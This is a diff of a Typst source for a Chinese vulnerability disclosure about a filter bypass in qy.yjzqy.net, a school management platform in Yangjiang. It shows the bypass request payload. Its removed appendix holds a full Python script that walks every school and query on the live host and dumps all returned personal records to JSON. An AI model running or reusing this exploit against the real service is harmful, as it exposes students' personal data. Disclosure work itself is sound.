@@ -1,5 +1,7 @@
 #import "@preview/charged-ieee:0.1.0": ieee
 
+#set text(font: "宋体", cjk-latin-spacing: auto, lang: "zh")
+
 #show: ieee.with(
   title: [qy.yjzqy.net Filter Bypass Vulnerability Disclosure],
   authors: (
@@ -14,7 +16,10 @@
     启业网作为被阳江市众多初高中学校使用的综合管理系统，在过去多年中，被广泛应用于各学校的校内信息公示、考试成绩公示、数据收集和分析等场景。尽管其并不开放源代码，我仍通过常规的、面向黑盒的审计方式，在不影响平台服务的前提下，发现了该平台的“信息查询”功能存在数据访问过滤绕过漏洞。
   ],
   bibliography: bibliography(("refs.yaml", "refs.bib")),
+  paper-size: "a4",
 )
+
+#set text(font: "宋体")
 
 = 背景
 
@@ -63,7 +68,7 @@
 
 == 理论可行性
 
-如 @alldataquerypayload 所示，利用上述性质，我们可以通过构造包含任意数据的`XXX_inf`字段且不包含任何常量字段的请求载荷，从服务器获取所有的数据记录。
+如@alldataquerypayload 所示，利用上述性质，我们可以通过构造包含任意数据的`XXX_inf`字段且不包含任何常量字段的请求载荷，从服务器获取所有的数据记录。
 
 #figure(
   rect[```
@@ -73,7 +78,7 @@
   caption: [一个能够获得所有数据的查询载荷]
 ) <alldataquerypayload>
 
-通过此种方式获取数据，由于数据返回时的无序性，在忽略服务端实现的处理时间的情况下，对特定返回数据列进行访问的时间复杂度为$O(n)$，在使用$m$叉B+树进行搜索优化时，理论时间复杂度可以被优化为$O(log_2 m dot log_m N)$。
+通过此种方式获取数据，由于数据返回时的无序性，在忽略服务端实现的处理时间的情况下，对特定返回数据列进行检索的时间复杂度为$O(n)$，在使用$m$叉B+树进行搜索优化时，理论时间复杂度可以被视为$O(log_2 m dot log_m N)$。
 
 == 实践可行性
 
@@ -109,98 +114,9 @@ xjh_inf=test&name_inf=test&zkzh_inf=test
 这些数据通常被视为不应公开的个人数据，因而我认为所有既定攻击目标均已达成。
 
 = 致谢
-Thanks to the person who created the Qiyewang. Thanks to the PHP Group for creating PHP Hypertext Preprocessor.
-Thanks to myself.
+感谢启业网的作者。感谢The PHP Group创造了PHP超文本预处理器#cite(<php>)。
+感谢我自己，也感谢所有参与本文审核的人。
 
 = 附录
 
-```py
-#!/usr/bin/env python3
-# SPDX-License-Identifier: AFL-3.0
-# Author: xtex <xtex@xtexx.eu.org>
-# This program is licensed under Academic Free License v3.0.
-import requests
-from bs4 import BeautifulSoup, Tag
-import os
-import json
-
-
-def getAllSchool() -> set[tuple[str, str]]:
-    r = requests.get("http://qy.yjzqy.net:9090/list/link_qy.php")
-    r.raise_for_status()
-    soup = BeautifulSoup(r.content, "html.parser", from_encoding="GB2312")
-    return set(
-        [
-            (
-                x.attrs["href"]
-                .removeprefix("http://qy.yjzqy.net:9090/sc/")
-                .removesuffix("/"),
-                x.text,
-            )
-            for x in soup.select("table td a")
-        ]
-    )
-
-
-def getInfoQueries(sch: str) -> set[tuple[int, str]]:
-    r = requests.get(f"http://qy.yjzqy.net:9090/sc/{sch}/stu_chaxun.php")
-    r.raise_for_status()
-    soup = BeautifulSoup(r.content, "html.parser", from_encoding="GB2312")
-    return set(
-        [
-            (int(x.attrs["value"]), x.text.strip())
-            for x in soup.select("table select[name='xmid'] option")
-        ]
-    )
-
-
-def getAllData(sch: str, q: int) -> list[dict]:
-    r = requests.post(
-        f"http://qy.yjzqy.net:9090/sc/{sch}/stu_chaxun.php",
-        data={
-            "xjh_inf": "a",
-            "name_inf": "a",
-            "zkzh_inf": "a",
-            "guanxi": "1",
-            "xmid": str(q),
-        },
-    )
-    r.raise_for_status()
-    soup = BeautifulSoup(r.content, "html.parser", from_encoding="GB2312")
-    els = list(soup.select("td.STYLE11"))[1].parent.parent
-    result = list()
-    data = {}
-    for tr in els:
-        tds = list(filter(lambda x: isinstance(x, Tag), list(tr)))
-        if len(tds) == 1:
-            if "符合条件信息" in tr.text:
-                data["TITLE"] = tr.text.strip()
-            else:
-                result.append(data)
-                data = {}
-        elif len(tds) == 2:
-            data[tds[0].text.strip()] = tds[1].text.strip()
-        elif len(tds) == 0:
-            pass
-        else:
-            raise RuntimeError(tds)
-    return result
-
-
-allsch = getAllSchool()
-for sch, schname in allsch:
-    print("SCHOOL", sch, schname)
-    schpath = f"out/{sch}{schname}"
-    os.makedirs(schpath, exist_ok=True)
-    if (
-        sch == "yjsyxx"
-    ):  # 服务器返回：无法连接数据库......http://qy.yjzqy.net:9090/sc/yjsyxx/
-        continue
-    qs = getInfoQueries(sch)
-    for q, qname in qs:
-        print("QUERY", sch, schname, q, qname)
-        data = getAllData(sch, q)
-        with open(f"{schpath}/{q}-{qname}.json", "w") as fp:
-            json.dump(data, fp, indent=4, ensure_ascii=False)
-
-```
+#raw(read("dump.py"), block: true, lang: "py")
